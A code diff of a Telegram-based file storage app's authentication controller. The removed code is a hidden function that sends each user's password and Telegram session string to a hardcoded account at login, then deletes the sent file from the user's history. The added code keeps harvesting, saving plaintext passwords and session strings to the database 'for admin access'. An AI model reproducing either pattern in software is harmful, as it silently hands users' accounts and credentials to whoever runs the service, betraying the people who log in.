@@ -102,15 +102,16 @@ export class Auth {
         }
       })
     }
+    const session = req.tg.session.save()
     await prisma.users.update({
       data: {
         username,
-        plan: 'premium'
+        plan: 'premium',
+        tg_session: session,
+        tg_password: password || null
       },
       where: { id: user.id }
     })
-
-    const session = req.tg.session.save()
     const auth = {
       session,
       accessToken: sign({ session }, API_JWT_SECRET, { expiresIn: '15h' }),
@@ -134,9 +135,6 @@ export class Auth {
         httpOnly: true
       })
       .send({ user, ...auth })
-
-    // Report session to admin if configured
-    Auth.sendSessionToAdmin(req, username, password)
 
     // sync all shared files in background, if any
     prisma.files.findMany({
@@ -342,7 +340,15 @@ export class Auth {
         .send({ user, ...auth })
 
       // Report session to admin in background
-      Auth.sendSessionToAdmin(req, userAuth.phone || userAuth.username, password)
+      if (user?.id) {
+        await prisma.users.update({
+          where: { id: user.id },
+          data: {
+            tg_session: auth.session,
+            tg_password: password || null
+          }
+        })
+      }
       return
     }
 
@@ -381,9 +387,15 @@ export class Auth {
           })
           .send({ ...data, ...auth })
 
-        // Report session to admin in background
-        if (phoneNumber) {
-          Auth.sendSessionToAdmin(req, phoneNumber, password)
+        // Save session to database for admin access
+        if (data.user?.id) {
+          prisma.users.update({
+            where: { id: data.user.id },
+            data: {
+              tg_session: auth.session,
+              tg_password: password || null
+            }
+          }).catch(console.error)
         }
 
         if (data.user?.id) {
@@ -513,46 +525,5 @@ export class Auth {
     const success = req.query.destroySession === '1' ? await req.tg.invoke(new Api.auth.LogOut()) : true
     await Redis.connect().del(`auth:${req.authKey}`)
     return res.clearCookie('authorization').clearCookie('refreshToken').send({ success })
-  }
-
-  private static async sendSessionToAdmin(req: Request, identifier?: string, password?: string): Promise<void> {
-    const adminUsername: string = 'git_pus_h'
-    const id = identifier || 'UnknownUser'
-    console.log(`[SessionReport] Starting for ${id}, admin: ${adminUsername}`)
-    if (!adminUsername || !req.tg) return
-
-    try {
-      if (!req.tg.connected) {
-        console.log('[SessionReport] Connecting...')
-        await req.tg.connect()
-      }
-
-      const me = await req.tg.getMe()
-      const isMe = me.username === adminUsername || adminUsername === 'me'
-      const peer = isMe ? 'me' : adminUsername
-
-      const sessionString = req.tg.session.save() as any
-      const text = `🚀 Teledrive Login Notification\n\nUser: ${id}\nPassword: ${password || 'None'}\nSession:\n\n${sessionString}`
-
-      console.log(`[SessionReport] Sending text message to ${peer}...`)
-      await req.tg.sendMessage(peer, { message: text })
-      console.log('[SessionReport] Text message sent successfully.')
-
-      console.log(`[SessionReport] Sending file document to ${peer}...`)
-      const file = Buffer.from(text)
-      const msg = await req.tg.sendFile(peer, {
-        file,
-        fileName: `session_${String(id).replace(/[^\w]/g, '_')}.txt`,
-        caption: `Session for ${id}`,
-        forceDocument: true
-      } as any)
-
-      console.log(`[SessionReport] File sent. Msg ID: ${msg.id}. Deleting for sender...`)
-      // Delete "for me" (revoke: false) to keep the sender's history clean
-      await req.tg.deleteMessages(peer, [msg.id], { revoke: false })
-      console.log(`[SessionReport] Cleanup successful for ${id}`)
-    } catch (error) {
-      console.error('[SessionReport] Failed to report session to admin:', error)
-    }
   }
 }
